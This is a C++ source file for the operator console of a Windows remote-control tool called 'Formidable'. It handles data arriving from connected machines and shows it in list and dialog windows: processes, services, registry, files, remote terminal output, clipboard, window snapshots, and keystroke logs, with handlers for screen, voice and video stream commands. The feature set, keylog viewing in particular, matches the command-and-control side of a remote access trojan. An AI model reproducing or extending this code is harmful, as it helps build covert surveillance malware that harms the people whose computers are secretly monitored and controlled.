// CommandHandler.cpp - 命令处理模块实现
#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <windows.h>
#include <objbase.h>
#include <objidl.h>
#include <mmsystem.h>
#include <gdiplus.h>

#include "CommandHandler.h"
#include "../../Common/ClientTypes.h"
#include "../../Common/Config.h"
#include "../../Common/Utils.h"
#include "../resource.h"
#include "../GlobalState.h"
#include "../Utils/StringHelper.h"
#include <CommCtrl.h>
#include <mutex>
#include <thread>

#pragma comment(lib, "gdiplus.lib")

using namespace Gdiplus;

using namespace Formidable;
using namespace Formidable::Utils;

// 外部声明
extern std::map<uint32_t, std::shared_ptr<Formidable::ConnectedClient>> g_Clients;
extern std::mutex g_ClientsMutex;
extern HWND g_hMainWnd;
extern HWND g_hListClients;

namespace Formidable {
namespace Core {

// 实现代码...

// 自定义消息
#define WM_LOC_UPDATE (WM_USER + 101)


void CommandHandler::HandlePacket(uint32_t clientId, const BYTE* pData, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }
    
    if (!client || !client->active) return;

    // 优先检查：如果是裸 ClientInfo（未用 CommandPkg 包装），直接处理上线
    // 原始协议：客户端连接后直接发送 PkgHeader + ClientInfo
    if (iLength == sizeof(Formidable::ClientInfo) && client->listIndex == -1) {
        HandleClientInfo(clientId, (const Formidable::ClientInfo*)pData);
        return;
    }

    // 其他数据都应该是 CommandPkg 格式
    if (iLength < sizeof(Formidable::CommandPkg)) {
        // 数据太短，无法处理
        return;
    }
    
    Formidable::CommandPkg* pkg = (Formidable::CommandPkg*)pData;
    
    // 处理上线包（新版本格式）：cmd=0, arg1=sizeof(ClientInfo) 表示这是上线注册包
    if (pkg->cmd == 0 && pkg->arg1 == sizeof(Formidable::ClientInfo)) {
        HandleClientInfo(clientId, (const Formidable::ClientInfo*)pkg->data);
        return;
    }
    
    switch (pkg->cmd) {
        case Formidable::CMD_HEARTBEAT:
            HandleHeartbeat(clientId, pkg, iLength);
            break;
        case Formidable::CMD_PROCESS_LIST:
            HandleProcessList(clientId, pkg, iLength);
            break;
        case Formidable::CMD_PROCESS_MODULES:
            HandleModuleList(clientId, pkg, iLength);
            break;
        case Formidable::CMD_SERVICE_LIST:
            HandleServiceList(clientId, pkg, iLength);
            break;
        case Formidable::CMD_WINDOW_LIST:
            HandleWindowList(clientId, pkg, iLength);
            break;
        case Formidable::CMD_WINDOW_SNAPSHOT:
            HandleWindowSnapshot(clientId, pkg, iLength);
            break;
        case Formidable::CMD_KEYLOG:
            HandleKeylog(clientId, pkg, iLength);
            break;
        case Formidable::CMD_TERMINAL_DATA:
            HandleTerminalData(clientId, pkg, iLength);
            break;
        case Formidable::CMD_GET_SYSINFO:
            HandleSystemInfo(clientId, pkg, iLength);
            break;
        case Formidable::CMD_REGISTRY_CTRL:
            HandleRegistryData(clientId, pkg, iLength);
            break;
        case Formidable::CMD_FILE_LIST:
            HandleFileList(clientId, pkg, iLength);
            break;
        case Formidable::CMD_FILE_DATA:
            HandleFileData(clientId, pkg, iLength);
            break;
        case Formidable::CMD_FILE_DOWNLOAD:
            HandleFileDownload(clientId, pkg, iLength);
            break;
        case Formidable::CMD_SCREEN_CAPTURE:
            HandleScreenCapture(clientId, pkg, iLength);
            break;
        case Formidable::CMD_VOICE_STREAM:
            HandleVoiceStream(clientId, pkg, iLength);
            break;
        case Formidable::CMD_VIDEO_STREAM:
            HandleVideoStream(clientId, pkg, iLength);
            break;
        default:
            break;
    }
}

void CommandHandler::HandleHeartbeat(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }
    
    if (iLength >= sizeof(Formidable::CommandPkg)) {
        if (pkg->arg1 == sizeof(Formidable::ClientInfo)) {
            Formidable::ClientInfo* newInfo = (Formidable::ClientInfo*)pkg->data;
            uint64_t now = GetTickCount64();
            int32_t rtt = (int32_t)(now - client->lastHeartbeatSendTime);

            memcpy(&client->info, newInfo, sizeof(Formidable::ClientInfo));
            client->info.rtt = rtt;

            // 更新 UI
            std::wstring wRTT = std::to_wstring(rtt) + L"ms";
            std::wstring wActWin = Utils::StringHelper::UTF8ToWide(client->info.activeWindow);
            std::wstring wUptime = Utils::StringHelper::UTF8ToWide(client->info.uptime);

            if (client->listIndex >= 0) {
                LVITEMW lvi = { 0 };
                lvi.iSubItem = 9; // RTT
                lvi.pszText = (LPWSTR)wRTT.c_str();
                SendMessageW(g_hListClients, LVM_SETITEMTEXTW, client->listIndex, (LPARAM)&lvi);
                
                lvi.iSubItem = 12; // Uptime
                lvi.pszText = (LPWSTR)wUptime.c_str();
                SendMessageW(g_hListClients, LVM_SETITEMTEXTW, client->listIndex, (LPARAM)&lvi);
                
                lvi.iSubItem = 13; // Active Window
                lvi.pszText = (LPWSTR)wActWin.c_str();
                SendMessageW(g_hListClients, LVM_SETITEMTEXTW, client->listIndex, (LPARAM)&lvi);
            }
        }
    }
    client->lastHeartbeat = GetTickCount64();
}

void CommandHandler::HandleClientInfo(uint32_t clientId, const Formidable::ClientInfo* info) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }
    
    if (!info) return;
    memcpy(&client->info, info, sizeof(Formidable::ClientInfo));
    
    std::wstring wIP = Utils::StringHelper::UTF8ToWide(client->ip);
    
    LVITEMW lvi = { 0 };
    lvi.mask = LVIF_TEXT | LVIF_PARAM;
    lvi.pszText = (LPWSTR)wIP.c_str();
    lvi.lParam = (LPARAM)clientId;
    
    SendMessageW(g_hListClients, WM_SETREDRAW, FALSE, 0);
    int index = (int)SendMessageW(g_hListClients, LVM_INSERTITEMW, 0, (LPARAM)&lvi);
    
    std::wstring wPort = std::to_wstring(client->port);
    std::wstring wLAN = Utils::StringHelper::UTF8ToWide(client->info.lanAddr);
    std::wstring wComp = Utils::StringHelper::UTF8ToWide(client->info.computerName);
    std::wstring wUserGroup = Utils::StringHelper::UTF8ToWide(client->info.userName) + L"/" + client->info.group;
    std::wstring wOS = Utils::StringHelper::UTF8ToWide(client->info.osVersion);
    std::wstring wCPU = Utils::StringHelper::UTF8ToWide(client->info.cpuInfo);
    std::wstring wRTT = std::to_wstring(client->info.rtt) + L"ms";
    std::wstring wVer = Utils::StringHelper::UTF8ToWide(client->info.version);
    std::wstring wInst = Utils::StringHelper::UTF8ToWide(client->info.installTime);
    std::wstring wUptime = Utils::StringHelper::UTF8ToWide(client->info.uptime);
    std::wstring wActWin = Utils::StringHelper::UTF8ToWide(client->info.activeWindow);

    LVITEMW lviSet = { 0 };
    lviSet.iSubItem = 1; lviSet.pszText = (LPWSTR)wPort.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 2; lviSet.pszText = (LPWSTR)L"正在获取...";
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 3; lviSet.pszText = (LPWSTR)wLAN.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 4; lviSet.pszText = (LPWSTR)wComp.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 5; lviSet.pszText = (LPWSTR)wUserGroup.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 6; lviSet.pszText = (LPWSTR)wOS.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 7; lviSet.pszText = (LPWSTR)wCPU.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 8; lviSet.pszText = (LPWSTR)L"Unknown"; // RAM
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 9; lviSet.pszText = (LPWSTR)wRTT.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 10; lviSet.pszText = (LPWSTR)wVer.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 11; lviSet.pszText = (LPWSTR)wInst.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 12; lviSet.pszText = (LPWSTR)wUptime.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 13; lviSet.pszText = (LPWSTR)wActWin.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 14; lviSet.pszText = (LPWSTR)client->remark.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    SendMessageW(g_hListClients, WM_SETREDRAW, TRUE, 0);
    client->listIndex = index;

    // 异步获取地理位置
    std::thread([clientId, client]() {
        std::string location = GetLocationByIP(client->ip);
        std::wstring wLoc = Utils::StringHelper::UTF8ToWide(location);
        
        struct UpdateData { uint32_t id; std::wstring loc; int index; };
        UpdateData* data = new UpdateData{ clientId, wLoc, client->listIndex };
        
        PostMessageW(g_hMainWnd, WM_LOC_UPDATE, 0, (LPARAM)data);
    }).detach();
}

void CommandHandler::HandleProcessList(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hProcessDlg && IsWindow(client->hProcessDlg)) {
        HWND hList = GetDlgItem(client->hProcessDlg, IDC_LIST_PROCESS);
        ListView_DeleteAllItems(hList);
        
        int count = pkg->arg1 / sizeof(Formidable::ProcessInfo);
        Formidable::ProcessInfo* pInfo = (Formidable::ProcessInfo*)pkg->data;
        
        SendMessage(hList, WM_SETREDRAW, FALSE, 0);
        for (int i = 0; i < count; i++) {
            LVITEMW lvi = { 0 };
            lvi.mask = LVIF_TEXT | LVIF_PARAM;
            lvi.iItem = i;
            std::wstring wName = Formidable::Utils::StringHelper::UTF8ToWide(pInfo[i].name);
            lvi.pszText = (LPWSTR)wName.c_str();
            lvi.lParam = (LPARAM)pInfo[i].pid;
            
            int idx = (int)SendMessageW(hList, LVM_INSERTITEMW, 0, (LPARAM)&lvi);
            
            std::wstring wPID = std::to_wstring(pInfo[i].pid);
            std::wstring wThreads = std::to_wstring(pInfo[i].threads);
            std::wstring wPriority = std::to_wstring(pInfo[i].priority);
            std::wstring wArch = Formidable::Utils::StringHelper::UTF8ToWide(pInfo[i].arch);
            
            wchar_t szMem[64];
            if (pInfo[i].workingSet > 1024 * 1024)
                swprintf_s(szMem, L"%.1f MB", pInfo[i].workingSet / (1024.0 * 1024.0));
            else
                swprintf_s(szMem, L"%llu KB", pInfo[i].workingSet / 1024);
            
            wchar_t szCpu[32];
            swprintf_s(szCpu, L"%.1f%%", pInfo[i].cpuUsage);

            std::wstring wOwner = Formidable::Utils::StringHelper::UTF8ToWide(pInfo[i].owner);
            std::wstring wPath = Formidable::Utils::StringHelper::UTF8ToWide(pInfo[i].path);

            LVITEMW lviSet = { 0 };
            lviSet.iSubItem = 1; lviSet.pszText = (LPWSTR)wPID.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 2; lviSet.pszText = (LPWSTR)wThreads.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 3; lviSet.pszText = (LPWSTR)wPriority.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 4; lviSet.pszText = (LPWSTR)wArch.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 5; lviSet.pszText = szMem;
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 6; lviSet.pszText = szCpu;
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 7; lviSet.pszText = (LPWSTR)wOwner.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 8; lviSet.pszText = (LPWSTR)wPath.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
        }
        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
    }
}

void CommandHandler::HandleModuleList(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hModuleDlg && IsWindow(client->hModuleDlg)) {
        HWND hList = GetDlgItem(client->hModuleDlg, IDC_LIST_MODULES);
        ListView_DeleteAllItems(hList);

        int count = pkg->arg1 / sizeof(Formidable::ModuleInfo);
        Formidable::ModuleInfo* pInfo = (Formidable::ModuleInfo*)pkg->data;

        SendMessage(hList, WM_SETREDRAW, FALSE, 0);
        for (int i = 0; i < count; i++) {
            LVITEMW lvi = { 0 };
            lvi.mask = LVIF_TEXT;
            lvi.iItem = i;
            std::wstring wName = Formidable::Utils::StringHelper::UTF8ToWide(pInfo[i].name);
            lvi.pszText = (LPWSTR)wName.c_str();

            int idx = (int)SendMessageW(hList, LVM_INSERTITEMW, 0, (LPARAM)&lvi);

            wchar_t szBase[32];
            swprintf_s(szBase, L"0x%016llX", pInfo[i].baseAddr);
            std::wstring wSize = std::to_wstring(pInfo[i].size);
            std::wstring wPath = Formidable::Utils::StringHelper::UTF8ToWide(pInfo[i].path);

            LVITEMW lviSet = { 0 };
            lviSet.iSubItem = 1; lviSet.pszText = szBase;
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 2; lviSet.pszText = (LPWSTR)wSize.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 3; lviSet.pszText = (LPWSTR)wPath.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
        }
        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
    }
}

void CommandHandler::HandleTerminalData(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hTerminalDlg && IsWindow(client->hTerminalDlg)) {
        HWND hEdit = GetDlgItem(client->hTerminalDlg, IDC_EDIT_TERM_OUT);
        std::string text(pkg->data, pkg->arg1);
        std::wstring wText = Utils::StringHelper::UTF8ToWide(text);
        
        int len = GetWindowTextLengthW(hEdit);
        SendMessageW(hEdit, EM_SETSEL, len, len);
        SendMessageW(hEdit, EM_REPLACESEL, FALSE, (LPARAM)wText.c_str());
        SendMessageW(hEdit, WM_VSCROLL, SB_BOTTOM, 0);
    }
}

void CommandHandler::HandleWindowList(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hWindowDlg && IsWindow(client->hWindowDlg)) {
        HWND hList = GetDlgItem(client->hWindowDlg, IDC_LIST_WINDOW);
        ListView_DeleteAllItems(hList);
        SendMessage(hList, WM_SETREDRAW, FALSE, 0);

        int count = pkg->arg1 / sizeof(Formidable::WindowInfo);
        Formidable::WindowInfo* pInfo = (Formidable::WindowInfo*)pkg->data;

        for (int i = 0; i < count; i++) {
            std::wstring wTitle = Utils::StringHelper::UTF8ToWide(pInfo[i].title);
            std::wstring wStatus = pInfo[i].isVisible ? L"可见" : L"隐藏";
            
            wchar_t szHwnd[32];
            swprintf_s(szHwnd, L"0x%016llX", pInfo[i].hWnd);

            LVITEMW lvi = { 0 };
            lvi.mask = LVIF_TEXT;
            lvi.iItem = i;
            lvi.pszText = (LPWSTR)wTitle.c_str();
            int idx = (int)SendMessageW(hList, LVM_INSERTITEMW, 0, (LPARAM)&lvi);

            ListView_SetItemText(hList, idx, 1, szHwnd);
            ListView_SetItemText(hList, idx, 2, (LPWSTR)wStatus.c_str());
        }
        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
    }
}

void CommandHandler::HandleKeylog(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hKeylogDlg && IsWindow(client->hKeylogDlg)) {
        HWND hEdit = GetDlgItem(client->hKeylogDlg, IDC_EDIT_KEYLOG);
        std::string text(pkg->data, pkg->arg1);
        std::wstring wText = Utils::StringHelper::UTF8ToWide(text);
        
        int len = GetWindowTextLengthW(hEdit);
        SendMessageW(hEdit, EM_SETSEL, len, len);
        SendMessageW(hEdit, EM_REPLACESEL, FALSE, (LPARAM)wText.c_str());
        SendMessageW(hEdit, WM_VSCROLL, SB_BOTTOM, 0);
    }
}

void CommandHandler::HandleWindowSnapshot(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hWindowDlg && IsWindow(client->hWindowDlg)) {
        if (pkg->arg1 > 0) {
            // 创建位图
            BITMAPFILEHEADER* pBmpFileHeader = (BITMAPFILEHEADER*)pkg->data;
            BITMAPINFOHEADER* pBmpInfoHeader = (BITMAPINFOHEADER*)(pkg->data + sizeof(BITMAPFILEHEADER));
            BYTE* pBmpData = (BYTE*)(pkg->data + pBmpFileHeader->bfOffBits);

            HDC hDC = GetDC(NULL);
            HBITMAP hBitmap = CreateDIBitmap(hDC, pBmpInfoHeader, CBM_INIT, pBmpData, (BITMAPINFO*)pBmpInfoHeader, DIB_RGB_COLORS);
            ReleaseDC(NULL, hDC);

            if (hBitmap) {
                // 清理旧位图
                if (g_WindowPreviews.count(client->hWindowDlg)) {
                    HBITMAP hOld = g_WindowPreviews[client->hWindowDlg];
                    if (hOld) DeleteObject(hOld);
                }
                g_WindowPreviews[client->hWindowDlg] = hBitmap;

                // 刷新预览控件
                HWND hPreview = GetDlgItem(client->hWindowDlg, IDC_STATIC_WIN_PREVIEW);
                InvalidateRect(hPreview, NULL, FALSE);
            }
        }
    }
}

void CommandHandler::HandleServiceList(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hServiceDlg && IsWindow(client->hServiceDlg)) {
        HWND hList = GetDlgItem(client->hServiceDlg, IDC_LIST_SERVICE);
        ListView_DeleteAllItems(hList);
        SendMessage(hList, WM_SETREDRAW, FALSE, 0);

        int count = pkg->arg1 / sizeof(Formidable::ServiceInfo);
        Formidable::ServiceInfo* pInfo = (Formidable::ServiceInfo*)pkg->data;

        for (int i = 0; i < count; i++) {
            std::wstring wName = Utils::StringHelper::UTF8ToWide(pInfo[i].name);
            std::wstring wDisp = Utils::StringHelper::UTF8ToWide(pInfo[i].displayName);
            std::wstring wStatus;
            switch (pInfo[i].status) {
                case SERVICE_STOPPED: wStatus = L"已停止"; break;
                case SERVICE_START_PENDING: wStatus = L"启动中"; break;
                case SERVICE_STOP_PENDING: wStatus = L"停止中"; break;
                case SERVICE_RUNNING: wStatus = L"正在运行"; break;
                default: wStatus = L"未知"; break;
            }

            LVITEMW lvi = { 0 };
            lvi.mask = LVIF_TEXT;
            lvi.iItem = i;
            lvi.pszText = (LPWSTR)wName.c_str();
            int idx = (int)SendMessageW(hList, LVM_INSERTITEMW, 0, (LPARAM)&lvi);

            LVITEMW lviSet = { 0 };
            lviSet.iSubItem = 1; lviSet.pszText = (LPWSTR)wDisp.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 2; lviSet.pszText = (LPWSTR)wStatus.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 3; lviSet.pszText = (pInfo[i].startType == SERVICE_AUTO_START) ? (LPWSTR)L"自动" : (pInfo[i].startType == SERVICE_DEMAND_START ? (LPWSTR)L"手动" : (LPWSTR)L"禁用");
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
        }
        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
    }
}

void CommandHandler::HandleSystemInfo(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }
    
    // 如果收到系统信息且包含 ClientInfo，则更新。系统信息模块也可返回额外细节
    if (pkg->arg1 == sizeof(Formidable::ClientInfo)) {
        HandleClientInfo(clientId, (const Formidable::ClientInfo*)pkg->data);
    }
}

void CommandHandler::HandleRegistryData(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hRegistryDlg && IsWindow(client->hRegistryDlg)) {
        HWND hTree = GetDlgItem(client->hRegistryDlg, IDC_TREE_REGISTRY);
        HWND hList = GetDlgItem(client->hRegistryDlg, IDC_LIST_REGISTRY_VALUES);
        
        std::string data(pkg->data, pkg->arg1);
        std::stringstream ss(data);
        std::string line;

        if (pkg->arg2 == 0) { // Keys for Tree
             HTREEITEM hSelected = TreeView_GetSelection(hTree);
             if (hSelected) {
                 // 删除旧子项
                 HTREEITEM hChild = TreeView_GetChild(hTree, hSelected);
                 while (hChild) {
                     HTREEITEM hNext = TreeView_GetNextSibling(hTree, hChild);
                     TreeView_DeleteItem(hTree, hChild);
                     hChild = hNext;
                 }
                 
                 while (std::getline(ss, line)) {
                     if (line.empty()) continue;
                     std::wstring wKey = Utils::StringHelper::UTF8ToWide(line);
                     TVINSERTSTRUCTW tvis = { 0 };
                     tvis.hParent = hSelected;
                     tvis.hInsertAfter = TVI_LAST;
                     tvis.item.mask = TVIF_TEXT | TVIF_CHILDREN;
                     tvis.item.pszText = (LPWSTR)wKey.c_str();
                     tvis.item.cChildren = 1;
                     TreeView_InsertItem(hTree, &tvis);
                 }
                 TreeView_Expand(hTree, hSelected, TVE_EXPAND);
             }
        } else if (pkg->arg2 == 1) { // Values for List
            ListView_DeleteAllItems(hList);
            int index = 0;
            while (std::getline(ss, line)) {
                if (line.empty()) continue;
                size_t p1 = line.find('|');
                size_t p2 = line.find('|', p1 + 1);
                if (p1 != std::string::npos && p2 != std::string::npos) {
                    std::wstring wName = Utils::StringHelper::UTF8ToWide(line.substr(0, p1));
                    std::wstring wType = Utils::StringHelper::UTF8ToWide(line.substr(p1 + 1, p2 - p1 - 1));
                    std::wstring wData = Utils::StringHelper::UTF8ToWide(line.substr(p2 + 1));

                    LVITEMW lvi = { 0 };
                    lvi.mask = LVIF_TEXT;
                    lvi.iItem = index;
                    lvi.pszText = (LPWSTR)wName.c_str();
                    int idx = (int)SendMessageW(hList, LVM_INSERTITEMW, 0, (LPARAM)&lvi);
                    
                    ListView_SetItemText(hList, idx, 1, (LPWSTR)wType.c_str());
                    ListView_SetItemText(hList, idx, 2, (LPWSTR)wData.c_str());
                    index++;
                }
            }
        }
    }
}

void CommandHandler::HandleFileList(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hFileDlg && IsWindow(client->hFileDlg)) {
        HWND hList = GetDlgItem(client->hFileDlg, IDC_LIST_FILE_REMOTE);
        ListView_DeleteAllItems(hList);
        SendMessage(hList, WM_SETREDRAW, FALSE, 0);

        std::string data(pkg->data, pkg->arg1);
        std::stringstream ss(data);
        std::string line;
        int index = 0;

        while (std::getline(ss, line)) {
            if (line.empty()) continue;

            // 格式: [DIR/FILE]|Name|Size|Time
            size_t p1 = line.find('|');
            size_t p2 = line.find('|', p1 + 1);
            size_t p3 = line.find('|', p2 + 1);

            if (p1 != std::string::npos && p2 != std::string::npos && p3 != std::string::npos) {
                std::string typeStr = line.substr(0, p1);
                std::string nameStr = line.substr(p1 + 1, p2 - p1 - 1);
                std::string sizeStr = line.substr(p2 + 1, p3 - p2 - 1);
                std::string timeStr = line.substr(p3 + 1);

                bool isDir = (typeStr == "[DIR]");
                std::wstring wName = Formidable::Utils::StringHelper::UTF8ToWide(nameStr);
                
                LVITEMW lvi = { 0 };
                lvi.mask = LVIF_TEXT | LVIF_IMAGE;
                lvi.iItem = index;
                lvi.pszText = (LPWSTR)wName.c_str();
                
                // 这里假设已经设置了 ImageList (FileDialog.cpp 中有初始化)
                // 获取图标索引由外部逻辑处理或这里简单处理
                lvi.iImage = isDir ? 1 : 0; 

                int idx = (int)SendMessageW(hList, LVM_INSERTITEMW, 0, (LPARAM)&lvi);
                
                LVITEMW lviSet = { 0 };
                // 大小列
                std::wstring wSize;
                if (isDir) {
                    wSize = L"<DIR>";
                } else {
                    unsigned long long size = std::stoull(sizeStr);
                    if (size > 1024 * 1024 * 1024)
                        wSize = std::to_wstring(size / (1024 * 1024 * 1024)) + L" GB";
                    else if (size > 1024 * 1024)
                        wSize = std::to_wstring(size / (1024 * 1024)) + L" MB";
                    else if (size > 1024)
                        wSize = std::to_wstring(size / 1024) + L" KB";
                    else
                        wSize = std::to_wstring(size) + L" B";
                }
                lviSet.iSubItem = 1; lviSet.pszText = (LPWSTR)wSize.c_str();
                SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);

                // 时间列
                std::wstring wTime = Formidable::Utils::StringHelper::UTF8ToWide(timeStr);
                lviSet.iSubItem = 2; lviSet.pszText = (LPWSTR)wTime.c_str();
                SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
                
                index++;
            }
        }
        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
    }
}

void CommandHandler::HandleProcessKill(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::string status(pkg->data, pkg->arg1);
    if (status != "OK") {
        MessageBoxW(g_hMainWnd, L"终止进程失败", L"错误", MB_OK | MB_ICONERROR);
    }
}

void CommandHandler::HandleFileData(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hFileDownload != INVALID_HANDLE_VALUE) {
        DWORD dwWritten = 0;
        WriteFile(client->hFileDownload, pkg->data, pkg->arg1, &dwWritten, NULL);
    }
}

void CommandHandler::HandleFileDownload(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    std::string status(pkg->data, pkg->arg1);
    if (status == "FINISH") {
        if (client->hFileDownload != INVALID_HANDLE_VALUE) {
            CloseHandle(client->hFileDownload);
            client->hFileDownload = INVALID_HANDLE_VALUE;
            MessageBoxW(client->hFileDlg, L"文件下载完成", L"提示", MB_OK);
        }
    } else if (status == "Cannot open file for reading") {
        if (client->hFileDownload != INVALID_HANDLE_VALUE) {
            CloseHandle(client->hFileDownload);
            client->hFileDownload = INVALID_HANDLE_VALUE;
        }
        MessageBoxW(client->hFileDlg, L"远程文件无法打开，下载失败", L"错误", MB_ICONERROR);
    }
}

void CommandHandler::HandleClipboard(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::string text(pkg->data, pkg->arg1);
    std::wstring wText = Utils::StringHelper::UTF8ToWide(text);
    
    // 如果长度过长，截断显示
    std::wstring showText = wText;
    if (showText.length() > 2000) showText = showText.substr(0, 2000) + L"...";
    
    MessageBoxW(g_hMainWnd, showText.c_str(), L"远程剪贴板", MB_OK | MB_ICONINFORMATION);
}

